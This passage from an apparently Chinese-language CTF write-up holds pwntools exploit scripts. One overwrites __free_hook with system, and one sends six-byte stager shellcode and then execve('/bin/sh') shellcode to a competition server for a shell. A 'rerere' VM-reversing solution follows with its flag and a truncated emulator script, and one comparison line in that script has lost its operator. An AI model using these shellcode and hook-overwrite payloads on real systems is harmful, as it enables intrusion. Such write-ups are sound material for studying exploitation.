    if debug:
        payload = payload.ljust(0x1000-0x20,'a')
        payload+= p64(libc.symbols['__free_hook'])
    else:
        payload = payload.ljust(0x100,'a')  
        payload+= p64(libc.symbols['__free_hook']) * 0x60
    edit_vul(payload)
    p.recvuntil('to?')
    p.send(p64(libc.symbols['system']))
    p.interactive()
### six
说来也巧，好像原题是云贵铁三赛的PWN，由七字节的shellcode变成六字节的shellcode，其他都没有变化。  
恰好当时在看雪的PWN板块和别人讨论过这题，直接就用了EXP：  
题目有个坑点就是mmap的地址是urandom来的，但是不满足mmap要求时，会随机分配这个地址，申请两块同样大小的mmap内存时，当随机分配时二者相邻，且用作栈的地址是低地址。  
shellcode运行时，将所有寄存器置0，用rsp就好了，从rsp一直覆写直到当前的rip的位置，写入拿shell的代码就可以了。  
手速太慢拿了二血，不知道一血是不是和我讨论的那位师傅...
    from pwn import *
    #p =process('./six')
    p=remote('117.78.26.97', 32200)#process('./seven')
    #gdb.attach(p)
    p.readuntil('shellcode:')
    payload=chr(0x54)+chr(0x5e)+chr(0x8b)+chr(0xd6)+chr(0x0F)+chr(0x05)
    p.send(payload)
    z=[
    0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFE, 0x48, 0x81, 0xC7, 0x4e, 0x0B, 0x00, 0x00, 0x4b, 0x48,0x33, 0xD2, 0x48,
    0x33, 0xF6, 0x0F, 0x05, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00]
    zz=''
    for i in range(0,len(z)):
        zz+=chr(z[i])
    payload='b'*0xb36+zz
    p.writeline(payload)
    p.interactive()
## Reverse
### rerere
简单VM逆向，通过分析VM代码，VM中要求输入长度为48，输入要求为[0-9A-F]，每八个输入为一组进行check，比较值分别为  
1672866348, 529818966, 1598735994, 2944977842, 1822759997, 4182965321  
最终flag为 flag{94CF259FD3C15AC62BBC88FAA76CA4F5655649F1C2AE5B36}
VM脚本如下
    opcode = '\x4f\x00\x00\x00\x2f\x55\x05\x54\x30\x46\x00\x47\x22\x48\x02\x4b\x33\x49\x4f\x00\x00\x00\x46\x54\x10\x48\x01\x4d\x27\x4f\x00\x00\x00\x30\x54\x10\x48\x01\x44\x16\x4f\x00\x00\x00\x39\x54\x10\x48\x01\x44\x0b\x4f\x00\x00\x00\x41\x54\x01\x48\x01\x44\x06\x47\x00\x48\x00\x4b\x05\x47\x00\x50\x00\x43\x55\x40\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\x63\xb5\xea\x2c\x54\x20\x48\x12\x47\x00\x4b\x03\x50\x00\x43\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\x1f\x94\x65\x56\x54\x20\x48\x12\x47\x00\x4b\x03\x50\x00\x43\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\x5f\x4a\xc6\x7a\x54\x20\x48\x12\x47\x00\x4b\x03\x50\x00\x43\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\xaf\x88\xcb\xb2\x54\x20\x48\x12\x47\x00\x4b\x03\x50\x00\x43\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\x6c\xa5\x1c\x3d\x54\x20\x48\x12\x47\x00\x4b\x03\x50\x00\x43\x4f\x00\x00\x00\x07\x54\x30\x47\x11\x56\x46\x00\x4f\x00\x00\x00\x30\x54\x20\x59\x02\x4f\x00\x00\x00\x0a\x54\x20\x48\x02\x44\x09\x4f\x00\x00\x00\x07\x54\x20\x59\x02\x4f\x00\x00\x00\x10\x54\x20\x58\x12\x53\x10\x55\x2b\x4f\xf9\x52\xfc\x49\x54\x20\x48\x12\x47\x00\x4b\x02\x50\x00\x43\x00'
    ans = []
    for i in opcode:
        ans.append(ord(i))
    opcode = ans[:]
    eax = 0x498ec0
    ecx = 0
    edx = 0
    ebx = 0
    zflag = 0
    input = '94CF259F'+'D3C15AC6'+'2BBC88FA'+'A76CA4F5'+'655649F1'+'C2AE5B36'
    print input
    ans = []
    for i in input:
        ans.append(ord(i))
    input = ans[:]
    index = 0
    stack = []
    eip = 0
    l = []
    def fetchNum1():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        t = opcode[eip+1]&0xf 
        if t == 0:
            return 'eax',eax
        elif t == 1:
            return 'ecx',ecx
        elif t == 2:
            return 'edx',edx
        elif t == 3:
            return 'ebx',ebx
        elif t == 4:
            return 'zflag',zflag
        else:
            return '0',0
    def fetchNum2():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        t = opcode[eip+1]>>4
        if t == 0:
            return 'eax',eax
        elif t == 1:
            return 'ecx',ecx
        elif t == 2:
            return 'edx',edx
        elif t == 3:
            return 'ebx',ebx
        elif t == 4:
            return 'zflag',zflag
        else:
            return '0',0
    def mov(a1):
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        t = opcode[eip+1]>>4
        if t == 0:
            eax = a1
            return 'eax'
        elif t == 1:
            ecx = a1
            return 'ecx'
        elif t == 2:
            edx = a1
            return 'edx'
        elif t == 3:
            ebx = a1
            return 'ebx'
    def jmpback():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        if zflag==-1:
            print 'zflag == -1, eip += %d = %d'%(opcode[eip+1]+2,eip+opcode[eip+1]+2)
            eip += opcode[eip+1]+2
        else:
            print 'zflag != -1, eip += 2 =%d'%(eip+2)       
            eip += 2 
    def notequaljmp():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        if zflag!=0:
            eip += 2
            print 'zflag !=0 eip+=2 = %d'%eip
        else:
            eip += opcode[eip+1]+2
            print 'zflag ==0 eip += %d = %d'%(opcode[eip+1]+2,eip)
    def equaljmp():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        if zflag == 1:
            eip += opcode[eip+1]+2
            print 'zflag == 1 eip += %d = %d'%(opcode[eip+1]+2,eip)
        else:
            print 'zflag != 1 eip += 2 = %d'%(eip)
            eip += 2
    def jmpupper():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        if ebx!=0 :
            ebx = ebx-1
            eip -= opcode[eip+1]
            print 'ebx(%x)!=0 eip-=%d = %d'%(ebx,opcode[eip+1],eip)
        else:
            eip += 2
            print 'ebx==0 eip += 2 = %d'%eip
    def mod():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,divider = fetchNum1()
        op2,dividend = fetchNum2()
        mov(dividend%divider)
        print 'mod %s(%x),%s(%x) = %d'%(op2,dividend,op1,divider,dividend%divider)
        eip += 2
    def movinput():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op = mov(input[index])
        print 'mov %s,input[%d](%x)'%(op,index,input[index])
        eip += 2
    def xor():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,divider = fetchNum1()
        op2,dividend = fetchNum2()
        mov(dividend^divider)
        print 'xor %s(%x),%s(%x) = %d'%(op2,dividend,op1,divider,dividend^divider)
        eip += 2
    def cmp():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v2 = fetchNum1()
        op2,v3 = fetchNum2()
        if v3==v2:
            zflag = 0
        elif v3  v2:
            zflag = 1
        print 'cmp %s(%x),%s(%x) zflag = %d'%(op2,v3,op1,v2,zflag)
        eip += 2
    def inc_input():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        index += 1
        print 'index += 1 = %d'%(index)
        eip += 1
    def v_and():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,divider = fetchNum1()
        op2,dividend = fetchNum2()
        mov(dividend&divider)
        print 'and  %s(%x),%s(%x) = %d'%(op2,dividend,op1,divider,dividend&divider)
        eip += 2
    def xor66():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        print 'xor66 called'
        i = 0
        while i<16:
            opcode[i] ^= 0x66
            opcode[i+1] ^= 0x66
            opcode[i+2] ^= 0x66
            opcode[i+3] ^= 0x66
            opcode[i+4] ^= 0x66
            i += 5
        eip += 16
    def dec():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum2()
        mov(v3-1)
        print 'dec %s(%x) = %d'%(op1,v3,v3-1)
        eip += 2
    def pushimm():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index,l
        data = opcode[eip+4]+(opcode[eip+3]+(opcode[eip+2]+(opcode[eip+1]<<8)<<8)<<8)
        stack.append(data)
        print 'push imm %x'%data
        l.append(data)
        eip += 5
    def inc():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum2()
        mov(v3+1)
        print 'inc %s(%x) = %d'%(op1,v3,v3+1)
        eip += 2
    def v_mov():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum1()
        op2 = mov(v3)
        print 'mov %s,%s'%(op2,op1)
        eip += 2
    def pushreg():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum2()
        stack.append(v3)
        print 'push reg %s(%x)'%(op1,v3)
        eip += 2
    def add():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum1()
        op2,v4 = fetchNum2()
        mov((v3+v4)&0xffffffff)
        print 'add %s(%x),%s(%x) = %x'%(op2,v4,op1,v3,v3+v4)
        eip += 2
    def popreg():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1 = mov(stack.pop())
        print 'pop %s'%op1
        eip += 2
    def dec_input():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        index -= 1
        print 'index -= 1 = %d'%(index)
        eip += 1
    def reg2input():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum2()
        input[index] = v3
        print 'input[%d] = %s(%x)'%(index,op1,v3)
        eip += 2
    def mul():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum1()
        op2,v4 = fetchNum2()
        mov((v3*v4)&0xffffffff)
        print 'mul %s(%x),%s(%x) = %x'%(op2,v3,op1,v4,v3*v4)
        eip += 2
    def sub():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        op1,v3 = fetchNum1()
        op2,v4 = fetchNum2()
        mov((v4-v3)&0xffffffff)